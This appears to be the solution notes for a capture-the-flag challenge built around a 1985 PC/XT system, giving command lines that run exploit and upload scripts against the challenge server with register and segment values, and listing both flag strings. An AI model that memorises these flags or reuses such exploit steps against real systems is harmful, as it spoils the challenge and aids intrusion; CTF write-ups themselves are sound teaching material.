This system has been running on a PC/XT sitting in our basement since 1985

Example solution for the first flag - this will work most of the time (a less fragile solution would use a NOP-sled or ROP)
```
python3 exploit.py --host challenges.pwnies.dk --port 1985 --ds 0x2DB5 --cs 0x8CF7 --bp 0x4F70
```

For the second flag
```
python3 upload_flag2.py --host challenges.pwnies.dk --port 1985 --password 'BHCTF{what_you_mean_concerned}' VDFLG/VDFLG.EXE
```


* Flag1: `BHCTF{what_you_mean_concerned}`
* Flag2: `BHCTF{Developers! Developers! Developers!}`
